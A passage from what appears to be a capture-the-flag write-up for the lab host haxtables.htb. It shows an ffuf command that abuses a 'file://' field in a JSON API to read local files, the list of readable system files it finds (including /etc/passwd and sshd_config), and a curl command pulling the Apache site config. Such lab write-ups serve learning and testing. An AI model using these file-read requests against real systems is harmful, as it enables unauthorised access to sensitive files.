</span></span><span class=line><span class=cl>&lt;/Directory&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;Directory /usr/share&gt;
</span></span><span class=line><span class=cl>    AllowOverride None
</span></span><span class=line><span class=cl>    Require all granted
</span></span><span class=line><span class=cl>&lt;/Directory&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;Directory /var/www/&gt;
</span></span><span class=line><span class=cl>    Options Indexes FollowSymLinks
</span></span><span class=line><span class=cl>    AllowOverride None
</span></span><span class=line><span class=cl>    Require all granted
</span></span><span class=line><span class=cl>&lt;/Directory&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#&lt;Directory /srv/&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#    Options Indexes FollowSymLinks</span>
</span></span><span class=line><span class=cl><span class=c1>#    AllowOverride None</span>
</span></span><span class=line><span class=cl><span class=c1>#    Require all granted</span>
</span></span><span class=line><span class=cl><span class=c1>#&lt;/Directory&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># AccessFileName: The name of the file to look for in each directory</span>
</span></span><span class=line><span class=cl><span class=c1># for additional configuration directives.  See also the AllowOverride</span>
</span></span><span class=line><span class=cl><span class=c1># directive.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>AccessFileName .htaccess
</span></span><span class=line><span class=cl>LimitRequestLine <span class=m>100000</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># The following lines prevent .htaccess and .htpasswd files from being</span>
</span></span><span class=line><span class=cl><span class=c1># viewed by Web clients.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>&lt;FilesMatch <span class=s2>&#34;^\.ht&#34;</span>&gt;
</span></span><span class=line><span class=cl>    Require all denied
</span></span><span class=line><span class=cl>&lt;/FilesMatch&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># The following directives define some format nicknames for use with</span>
</span></span><span class=line><span class=cl><span class=c1># a CustomLog directive.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># These deviate from the Common Log Format definitions in that they use %O</span>
</span></span><span class=line><span class=cl><span class=c1># (the actual bytes sent including headers) instead of %b (the size of the</span>
</span></span><span class=line><span class=cl><span class=c1># requested file), because the latter makes it impossible to detect partial</span>
</span></span><span class=line><span class=cl><span class=c1># requests.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.</span>
</span></span><span class=line><span class=cl><span class=c1># Use mod_remoteip instead.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>LogFormat <span class=s2>&#34;%v:%p %h %l %u %t \&#34;%r\&#34; %&gt;s %O \&#34;%{Referer}i\&#34; \&#34;%{User-Agent}i\&#34;&#34;</span> vhost_combined
</span></span><span class=line><span class=cl>LogFormat <span class=s2>&#34;%h %l %u %t \&#34;%r\&#34; %&gt;s %O \&#34;%{Referer}i\&#34; \&#34;%{User-Agent}i\&#34;&#34;</span> combined
</span></span><span class=line><span class=cl>LogFormat <span class=s2>&#34;%h %l %u %t \&#34;%r\&#34; %&gt;s %O&#34;</span> common
</span></span><span class=line><span class=cl>LogFormat <span class=s2>&#34;%{Referer}i -&gt; %U&#34;</span> referer
</span></span><span class=line><span class=cl>LogFormat <span class=s2>&#34;%{User-agent}i&#34;</span> agent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Include of directories ignores editors&#39; and dpkg&#39;s backup files,</span>
</span></span><span class=line><span class=cl><span class=c1># see README.Debian for details.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Include generic snippets of statements</span>
</span></span><span class=line><span class=cl>IncludeOptional conf-enabled/*.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Include the virtual host configurations:</span>
</span></span><span class=line><span class=cl>IncludeOptional sites-enabled/*.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
</span></span></code></pre></td></tr></table></div></div><p>To speed things up, I decided to search for LFI wordlists I could run with <code>ffuf</code> &ndash; and found the following:</p><p><a href=https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux target=_blank rel="noopener noreffer">https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux</a></p><p>We run <code>ffuf</code> and filter out responses with size 11 bytes, which gives us valid responses:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ffuf</span> -u <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file://FUZZ&#34;}&#39;</span> -w LFI-WordList-Linux -fs <span class=m>11</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v1.4.1-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : POST
</span></span><span class=line><span class=cl> :: URL              : http://api.haxtables.htb/v3/tools/string/index.php
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: LFI-WordList-Linux
</span></span><span class=line><span class=cl> :: Header           : Content-Type: application/json
</span></span><span class=line><span class=cl> :: Data             : <span class=o>{</span><span class=s2>&#34;action&#34;</span>: <span class=s2>&#34;b64encode&#34;</span>, <span class=s2>&#34;file_url&#34;</span>: <span class=s2>&#34;file://FUZZ&#34;</span><span class=o>}</span>
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span class=line><span class=cl> :: Filter           : Response size: <span class=m>11</span>
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/etc/apache2/mods-enabled/dir.conf <span class=o>[</span>Status: 200, Size: 223, Words: 1, Lines: 1, Duration: 37ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/adduser.conf       <span class=o>[</span>Status: 200, Size: 4051, Words: 1, Lines: 1, Duration: 36ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/ports.conf <span class=o>[</span>Status: 200, Size: 439, Words: 1, Lines: 1, Duration: 41ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-available/proxy.conf <span class=o>[</span>Status: 200, Size: 1107, Words: 1, Lines: 1, Duration: 39ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/apache2.conf <span class=o>[</span>Status: 200, Size: 9675, Words: 1, Lines: 1, Duration: 50ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-available/deflate.conf <span class=o>[</span>Status: 200, Size: 627, Words: 1, Lines: 1, Duration: 53ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-enabled/deflate.conf <span class=o>[</span>Status: 200, Size: 627, Words: 1, Lines: 1, Duration: 57ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-enabled/mime.conf <span class=o>[</span>Status: 200, Size: 10276, Words: 1, Lines: 1, Duration: 58ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-available/autoindex.conf <span class=o>[</span>Status: 200, Size: 4512, Words: 1, Lines: 1, Duration: 63ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/envvars    <span class=o>[</span>Status: 200, Size: 2387, Words: 1, Lines: 1, Duration: 65ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/bash.bashrc        <span class=o>[</span>Status: 200, Size: 3104, Words: 1, Lines: 1, Duration: 40ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-available/ssl.conf <span class=o>[</span>Status: 200, Size: 4159, Words: 1, Lines: 1, Duration: 81ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/ca-certificates.conf <span class=o>[</span>Status: 200, Size: 7387, Words: 1, Lines: 1, Duration: 30ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-available/setenvif.conf <span class=o>[</span>Status: 200, Size: 1719, Words: 1, Lines: 1, Duration: 94ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-enabled/negotiation.conf <span class=o>[</span>Status: 200, Size: 979, Words: 1, Lines: 1, Duration: 99ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/crypttab           <span class=o>[</span>Status: 200, Size: 83, Words: 1, Lines: 1, Duration: 34ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-enabled/status.conf <span class=o>[</span>Status: 200, Size: 1011, Words: 1, Lines: 1, Duration: 99ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-enabled/alias.conf <span class=o>[</span>Status: 200, Size: 1135, Words: 1, Lines: 1, Duration: 102ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-available/mime.conf <span class=o>[</span>Status: 200, Size: 10276, Words: 1, Lines: 1, Duration: 90ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/crontab            <span class=o>[</span>Status: 200, Size: 1527, Words: 1, Lines: 1, Duration: 49ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/debian_version     <span class=o>[</span>Status: 200, Size: 31, Words: 1, Lines: 1, Duration: 40ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/ca-certificates.conf.dpkg-old <span class=o>[</span>Status: 200, Size: 7383, Words: 1, Lines: 1, Duration: 63ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/dhcp/dhclient.conf <span class=o>[</span>Status: 200, Size: 1051, Words: 1, Lines: 1, Duration: 38ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/default/grub       <span class=o>[</span>Status: 200, Size: 1643, Words: 1, Lines: 1, Duration: 42ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/apache2/mods-available/dir.conf <span class=o>[</span>Status: 200, Size: 223, Words: 1, Lines: 1, Duration: 125ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/hostname           <span class=o>[</span>Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 27ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/debconf.conf       <span class=o>[</span>Status: 200, Size: 3971, Words: 1, Lines: 1, Duration: 60ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/deluser.conf       <span class=o>[</span>Status: 200, Size: 819, Words: 1, Lines: 1, Duration: 55ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/hosts.allow        <span class=o>[</span>Status: 200, Size: 559, Words: 1, Lines: 1, Duration: 42ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/hosts              <span class=o>[</span>Status: 200, Size: 391, Words: 1, Lines: 1, Duration: 44ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/hosts.deny         <span class=o>[</span>Status: 200, Size: 959, Words: 1, Lines: 1, Duration: 51ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/fuse.conf          <span class=o>[</span>Status: 200, Size: 939, Words: 1, Lines: 1, Duration: 54ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/fstab              <span class=o>[</span>Status: 200, Size: 911, Words: 1, Lines: 1, Duration: 73ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/group              <span class=o>[</span>Status: 200, Size: 1075, Words: 1, Lines: 1, Duration: 64ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/group-             <span class=o>[</span>Status: 200, Size: 1055, Words: 1, Lines: 1, Duration: 72ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/issue              <span class=o>[</span>Status: 200, Size: 47, Words: 1, Lines: 1, Duration: 33ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/issue.net          <span class=o>[</span>Status: 200, Size: 39, Words: 1, Lines: 1, Duration: 50ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/hdparm.conf        <span class=o>[</span>Status: 200, Size: 5927, Words: 1, Lines: 1, Duration: 91ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/modules            <span class=o>[</span>Status: 200, Size: 271, Words: 1, Lines: 1, Duration: 34ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/logrotate.conf     <span class=o>[</span>Status: 200, Size: 803, Words: 1, Lines: 1, Duration: 47ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/ld.so.conf         <span class=o>[</span>Status: 200, Size: 59, Words: 1, Lines: 1, Duration: 57ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/ldap/ldap.conf     <span class=o>[</span>Status: 200, Size: 459, Words: 1, Lines: 1, Duration: 61ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/host.conf          <span class=o>[</span>Status: 200, Size: 135, Words: 1, Lines: 1, Duration: 106ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/login.defs         <span class=o>[</span>Status: 200, Size: 14324, Words: 1, Lines: 1, Duration: 51ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/manpath.config     <span class=o>[</span>Status: 200, Size: 6967, Words: 1, Lines: 1, Duration: 54ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/pam.conf           <span class=o>[</span>Status: 200, Size: 747, Words: 1, Lines: 1, Duration: 24ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/mtab               <span class=o>[</span>Status: 200, Size: 2047, Words: 1, Lines: 1, Duration: 65ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/passwd             <span class=o>[</span>Status: 200, Size: 2507, Words: 1, Lines: 1, Duration: 59ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/profile            <span class=o>[</span>Status: 200, Size: 787, Words: 1, Lines: 1, Duration: 43ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/networks           <span class=o>[</span>Status: 200, Size: 135, Words: 1, Lines: 1, Duration: 81ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/security/access.conf <span class=o>[</span>Status: 200, Size: 6099, Words: 1, Lines: 1, Duration: 32ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/passwd-            <span class=o>[</span>Status: 200, Size: 2443, Words: 1, Lines: 1, Duration: 93ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/os-release         <span class=o>[</span>Status: 200, Size: 527, Words: 1, Lines: 1, Duration: 98ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/security/limits.conf <span class=o>[</span>Status: 200, Size: 2895, Words: 1, Lines: 1, Duration: 29ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/security/namespace.conf <span class=o>[</span>Status: 200, Size: 2195, Words: 1, Lines: 1, Duration: 29ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/security/group.conf <span class=o>[</span>Status: 200, Size: 4859, Words: 1, Lines: 1, Duration: 38ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/security/time.conf <span class=o>[</span>Status: 200, Size: 2919, Words: 1, Lines: 1, Duration: 28ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/security/pam_env.conf <span class=o>[</span>Status: 200, Size: 3976, Words: 1, Lines: 1, Duration: 33ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/sensors3.conf      <span class=o>[</span>Status: 200, Size: 14135, Words: 1, Lines: 1, Duration: 36ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/ssh/sshd_config    <span class=o>[</span>Status: 200, Size: 4387, Words: 1, Lines: 1, Duration: 34ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/sysctl.d/10-network-security.conf <span class=o>[</span>Status: 200, Size: 223, Words: 1, Lines: 1, Duration: 39ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/sysctl.d/10-console-messages.conf <span class=o>[</span>Status: 200, Size: 115, Words: 1, Lines: 1, Duration: 44ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/sysctl.conf        <span class=o>[</span>Status: 200, Size: 3151, Words: 1, Lines: 1, Duration: 46ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/timezone           <span class=o>[</span>Status: 200, Size: 23, Words: 1, Lines: 1, Duration: 48ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/resolv.conf        <span class=o>[</span>Status: 200, Size: 1239, Words: 1, Lines: 1, Duration: 130ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/etc/security/sepermit.conf <span class=o>[</span>Status: 200, Size: 571, Words: 1, Lines: 1, Duration: 119ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/net/tcp           <span class=o>[</span>Status: 200, Size: 811, Words: 1, Lines: 1, Duration: 24ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/cpuinfo           <span class=o>[</span>Status: 200, Size: 3023, Words: 1, Lines: 1, Duration: 29ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/net/udp           <span class=o>[</span>Status: 200, Size: 1035, Words: 1, Lines: 1, Duration: 23ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/self/cmdline      <span class=o>[</span>Status: 200, Size: 115, Words: 1, Lines: 1, Duration: 34ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/meminfo           <span class=o>[</span>Status: 200, Size: 1903, Words: 1, Lines: 1, Duration: 40ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/devices           <span class=o>[</span>Status: 200, Size: 831, Words: 1, Lines: 1, Duration: 42ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/self/stat         <span class=o>[</span>Status: 200, Size: 431, Words: 1, Lines: 1, Duration: 28ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/self/mounts       <span class=o>[</span>Status: 200, Size: 2047, Words: 1, Lines: 1, Duration: 32ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/self/status       <span class=o>[</span>Status: 200, Size: 1907, Words: 1, Lines: 1, Duration: 34ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/proc/version           <span class=o>[</span>Status: 200, Size: 255, Words: 1, Lines: 1, Duration: 57ms<span class=o>]</span>
</span></span><span class=line><span class=cl>/usr/share/adduser/adduser.conf <span class=o>[</span>Status: 200, Size: 4051, Words: 1, Lines: 1, Duration: 37ms<span class=o>]</span>
</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>771/771<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>1154</span> req/sec :: Duration: <span class=o>[</span>0:00:01<span class=o>]</span> :: Errors: <span class=m>0</span> ::
</span></span></code></pre></td></tr></table></div></div><p>When looking at <code>/etc/apache2/ports.conf</code> , a comment references <code>/etc/apache2/sites-enabled/000-default.conf</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># If you just change the port or add more ports here, you will likely also
</span></span><span class=line><span class=cl># have to change the VirtualHost statement in
</span></span><span class=line><span class=cl># /etc/apache2/sites-enabled/000-default.conf
</span></span></code></pre></td></tr></table></div></div><p>Looking at this file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///etc/apache2/sites-enabled/000-default.conf&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>2048</span>    <span class=m>0</span>  <span class=m>1959</span>  <span class=m>100</span>    <span class=m>89</span>  <span class=m>43267</span>   <span class=m>1965</span> --:--:-- --:--:-- --:--:-- <span class=m>46545</span>
</span></span><span class=line><span class=cl>&lt;VirtualHost *:80&gt;
</span></span><span class=line><span class=cl>    ServerName haxtables.htb
</span></span><span class=line><span class=cl>    ServerAdmin webmaster@localhost
</span></span><span class=line><span class=cl>    DocumentRoot /var/www/html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ErrorLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/error.log
</span></span><span class=line><span class=cl>    CustomLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/access.log combined
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;/VirtualHost&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;VirtualHost *:80&gt;
</span></span><span class=line><span class=cl>    ServerName api.haxtables.htb
</span></span><span class=line><span class=cl>    ServerAdmin webmaster@localhost
</span></span><span class=line><span class=cl>    DocumentRoot /var/www/api
</span></span><span class=line><span class=cl>    ErrorLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/error.log
</span></span><span class=line><span class=cl>    CustomLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/access.log combined
</span></span><span class=line><span class=cl>&lt;/VirtualHost&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;VirtualHost *:80&gt;
</span></span><span class=line><span class=cl>        ServerName image.haxtables.htb
</span></span><span class=line><span class=cl>        ServerAdmin webmaster@localhost
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    DocumentRoot /var/www/image
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        ErrorLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/error.log
</span></span><span class=line><span class=cl>        CustomLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/access.log combined
</span></span><span class=line><span class=cl>    <span class=c1>#SecRuleEngine On</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    &lt;LocationMatch /&gt;
</span></span><span class=line><span class=cl>          SecAction initcol:ip<span class=o>=</span>%<span class=o>{</span>REMOTE_ADDR<span class=o>}</span>,pass,nolog,id:<span class=s1>&#39;200001&#39;</span>
</span></span><span class=line><span class=cl>          SecAction <span class=s2>&#34;phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:&#39;200002&#39;&#34;</span>
</span></span><span class=line><span class=cl>          SecRule IP:SOMEPATHCOUNTER <span class=s2>&#34;@gt 5&#34;</span> <span class=s2>&#34;phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:&#39;200003&#39;&#34;</span>
</span></span><span class=line><span class=cl>          SecAction <span class=s2>&#34;phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:&#39;200004&#39;&#34;</span>
</span></span><span class=line><span class=cl>          Header always <span class=nb>set</span> Retry-After <span class=s2>&#34;10&#34;</span> <span class=nv>env</span><span class=o>=</span>RATELIMITED
</span></span><span class=line><span class=cl>    &lt;/LocationMatch&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ErrorDocument <span class=m>429</span> <span class=s2>&#34;Rate Limit Exceeded&#34;</span>
</span></span><span class=line><span class=cl>
